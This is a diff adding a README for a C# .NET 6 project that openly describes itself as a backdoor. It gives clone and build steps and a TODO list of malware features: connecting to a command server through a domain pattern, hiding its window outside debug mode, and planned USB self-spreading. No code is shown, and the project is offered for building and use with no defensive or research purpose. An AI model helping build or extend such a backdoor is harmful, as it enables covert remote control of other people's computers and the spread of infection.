@@ -1,3 +1,24 @@
+# LannBackdoor
+--- This is backdoor written in C# using .NET 6
+
+### Prerequisites
+- This project is using `.NET 6` so you need to install it
+
+### Installing
+1. Clone Repository
+```sh
+$ git clone https://github.com/Luminate-D/LannBackdoor.git
+```
+
+2. Open `LannBackdoor.sln` with your IDE (VS / JetBrains Rider)
+3. Restore NuGet Packages
+
+### Building & Running
+- Make your changes and build & run using the button in the IDE
+
+##### If you have got any issues, feel free to report them at the [issues page](https://github.com/Luminate-D/LannBackdoor/issues)
+
+## --- TODO List
 - [x] Connecting to server using pattern xxxx-{0}.dom
 - [x] Hiding window when Debug = false
 - [ ] USB Spread
